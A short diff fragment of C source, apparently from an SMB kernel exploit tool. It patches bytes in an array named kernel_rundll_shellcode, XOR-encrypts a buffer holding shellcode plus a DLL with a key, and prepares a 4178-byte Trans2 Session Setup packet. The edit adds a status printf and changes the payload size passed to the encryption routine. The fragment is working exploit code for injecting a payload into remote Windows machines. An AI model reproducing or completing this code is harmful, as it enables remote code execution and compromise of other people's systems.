@@ -625,7 +625,8 @@ int main(int argc, char* argv[])
 	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
 	*(DWORD*)&kernel_rundll_shellcode[2166 + 0xF86] = 1;
 	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
-	xor_payload(XorKey, (char*)pExeBuffer, full_size);
+	printf("encrypting the shellcode + DLL with XorKey in buffer!\n");
+	xor_payload(XorKey, (char*)pExeBuffer, total_payload_size);
 
 	//build packet buffer with 4178 bytes in length
 	//70 bytes for the Trans2 Session Setup packet header
